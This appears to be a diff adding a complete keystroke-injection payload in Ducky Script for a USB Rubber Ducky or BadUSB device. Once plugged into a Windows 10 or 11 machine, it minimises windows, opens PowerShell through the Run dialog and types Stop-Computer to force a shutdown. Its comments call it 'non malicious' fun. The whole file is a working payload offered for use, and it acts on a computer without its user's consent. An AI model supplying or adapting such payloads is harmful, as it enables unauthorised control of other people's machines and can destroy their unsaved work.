@@ -1,0 +1,13 @@
+REM *** SHUT THEM DOWN! ***
+REM ***  By Sl66p </3   ***
+REM TARGET = Win 10 / Win 11
+REM Functions = Plugs in and uses terminal to shutdown win 10 / win 11 machines
+REM NON MALICIOUS -- HAVE SOME FUN! :)
+DELAY 1000
+WIN m
+DELAY 250
+WIN r
+DELAY 250
+STRING powershell
+DELAY 750
+STRING Stop-Computer
